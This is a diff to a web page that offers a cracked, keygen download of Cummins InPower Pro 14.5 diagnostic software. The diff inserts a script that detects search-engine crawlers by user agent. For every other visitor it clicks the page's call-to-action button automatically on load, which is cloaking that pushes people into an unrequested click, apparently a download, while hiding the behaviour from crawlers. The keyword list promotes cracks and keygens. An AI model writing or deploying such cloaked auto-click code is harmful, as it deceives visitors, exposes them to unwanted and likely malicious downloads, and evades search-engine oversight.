@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cummins InPower Pro 14.5</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Cummins InPower Pro 14.5 diagnostic software valid till 2030 for Windows 10/11; supports Inline 6 &amp; 7 hardware">
     <meta name="keywords" content="Cummins InPower Pro 14.5, Cummins InPower Pro 14.5 download, Cummins InPower Pro 14.5 free download, Cummins InPower Pro 14.5 diagnostic software, Cummins diagnostic software, Cummins InPower Pro 2030, Cummins diagnostic software download, Cummins InPower Pro 14.5 crack, Cummins InPower Pro 14.5 keygen, Cummins InPower Pro 14.5 expire till 2030, Cummins power generation software, Cummins genset control software, InPower Pro 14.5 free download, InPower Pro 14.5 keygen, InPower Pro 14.5 crack, Cummins generator diagnostic, Cummins InPower Pro скачать, Cummins InPower Pro бесплатно скачать, Cummins InPower Pro 14.5 скачать, Cummins InPower Pro 14.5 бесплатно, генераторный диагностический программное обеспечение Cummins, гесет диагностическое программное обеспечение, Cummins диагностическое программное обеспечение, Cummins InPower Pro 14.5 download free, Cummins InPower Pro 14.5 software, Cummins InPower Pro 14.5 high speed download">
     <style>
